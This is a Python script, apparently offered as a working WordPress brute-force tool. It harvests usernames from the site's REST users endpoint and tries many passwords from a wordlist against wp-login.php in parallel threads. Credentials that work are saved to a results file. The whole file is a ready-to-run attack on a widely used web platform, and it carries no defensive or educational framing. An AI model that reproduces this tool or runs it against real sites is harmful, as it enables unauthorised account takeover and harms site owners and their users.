import requests
import concurrent.futures
import sys
import re
import os
import argparse

curl_timeout = 20
DEFAULT_THREAD_LIMIT = 10
BATCH_SIZE = 100  # Nombre de mots de passe traités en parallèle

# Colors for terminal output
RED = '\033[31m'
GRN = '\033[32m'
CYN = '\033[36m'
CLR = '\033[0m'

# TODO : Add the possibility of setting a user name as an argument.

def get_user_wpjson(session, target):
    try:
        response = session.get(f"{target}/wp-json/wp/v2/users", timeout=curl_timeout)
        response.raise_for_status()
        usernames = re.findall(r'"slug":"(.*?)"', response.text)
        if not usernames:
            print(f"{CYN}INFO: Cannot detect Username!{CLR}")
        else:
            with open('wpusername.tmp', 'w') as f:
                for username in usernames:
                    print(f"INFO: Found username \"{username}\"...")
                    f.write(f"{username}\n")
    except requests.RequestException as e:
        print(f"{CYN}INFO: Cannot detect Username! Error: {e}{CLR}")

def test_login(session, target, username, password):
    try:
        response = session.post(f"{target}/wp-login.php",
                                 data={'log': username, 'pwd': password, 'wp-submit': 'Log In'},
                                 timeout=curl_timeout,
                                 allow_redirects=False)  # Désactiver les redirections pour vérifier le code de statut 302
        if "login_error" in response.text:
            print(f"{CYN}Failed Login {target} {username}:{password}{CLR}")
        elif response.status_code == 302:  # Code de statut 302 indique une redirection après une connexion réussie
            print(f"{GRN}[!] Successfully logged in {target} \033[30;48;5;82m {username}:{password} {CLR}")
            with open('wpbf-results.txt', 'a') as f:
                f.write(f"{target} [{username}:{password}]\n")
        else:
            print(f"{CYN}Failed Login {target} {username}:{password}{CLR}")
    except requests.RequestException as e:
        print(f"{CYN}Failed Login {target} {username}:{password} Error: {e}{CLR}")

def process_password_batch(session, target, username, password_batch):
    with concurrent.futures.ThreadPoolExecutor(max_workers=DEFAULT_THREAD_LIMIT) as executor:
        futures = [executor.submit(test_login, session, target, username, password) for password in password_batch]
        concurrent.futures.wait(futures)

def main():
    global DEFAULT_THREAD_LIMIT
    parser = argparse.ArgumentParser(description="WordPress brute force tool")
    parser.add_argument("target", help="Target WordPress site URL")
    parser.add_argument("password_list", help="File containing list of passwords")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREAD_LIMIT, help="Number of concurrent threads")
    parser.add_argument("--priority-user", help="Username to prioritize", default=None)
    args = parser.parse_args()

    target = args.target
    password_list_file = args.password_list
    priority_user = args.priority_user
    DEFAULT_THREAD_LIMIT = args.threads

    if not os.path.isfile(password_list_file):
        print(f"{RED}ERROR: Wordlist not found!{CLR}")
        sys.exit(1)

    session = requests.Session()
    try:
        response = session.get(f"{target}/wp-login.php", timeout=curl_timeout)
        if "wp-submit" not in response.text:
            print(f"{RED}ERROR: WordPress wp-login not detected!{CLR}")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"{RED}ERROR: WordPress wp-login not detected! Error: {e}{CLR}")
        sys.exit(1)

    get_user_wpjson(session, target)

    if os.path.isfile('wpusername.tmp'):
        with open('wpusername.tmp', 'r') as f:
            usernames = f.read().splitlines()

        if priority_user:
            if priority_user in usernames:
                usernames.remove(priority_user)
                usernames.insert(0, priority_user)
            else:
                print(f"{CYN}INFO: Priority username '{priority_user}' not found in detected usernames.{CLR}")

        for username in usernames:
            with open(password_list_file, 'r', encoding='latin-1') as pf:
                password_batch = []
                for password in pf:
                    password = password.strip()
                    if not password:
                        continue
                    password_batch.append(password)
                    if len(password_batch) >= BATCH_SIZE:
                        process_password_batch(session, target, username, password_batch)
                        password_batch = []
                if password_batch:
                    process_password_batch(session, target, username, password_batch)

    else:
        print(f"{CYN}INFO: Cannot find username{CLR}")
        username = input("[?] Enter username manually: ")

        if not username:
            print(f"{RED}ERROR: Username cannot be empty!{CLR}")
            sys.exit(1)

        if priority_user and priority_user != username:
            print(f"{CYN}INFO: Priority username '{priority_user}' does not match the manually entered username '{username}'. Proceeding with the manually entered username.{CLR}")

        with open(password_list_file, 'r', encoding='latin-1') as pf:
            password_batch = []
            for password in pf:
                password = password.strip()
                if not password:
                    continue
                password_batch.append(password)
                if len(password_batch) >= BATCH_SIZE:
                    process_password_batch(session, target, username, password_batch)
                    password_batch = []
            if password_batch:
                process_password_batch(session, target, username, password_batch)

    if os.path.isfile('wpbf-results.txt'):
        with open('wpbf-results.txt', 'r') as f:
            lines = f.readlines()
            count = len(set(lines))
            print(f"Successfully logged in {count} username & password pairs in ./wpbf-results.txt")

if __name__ == "__main__":
    main()
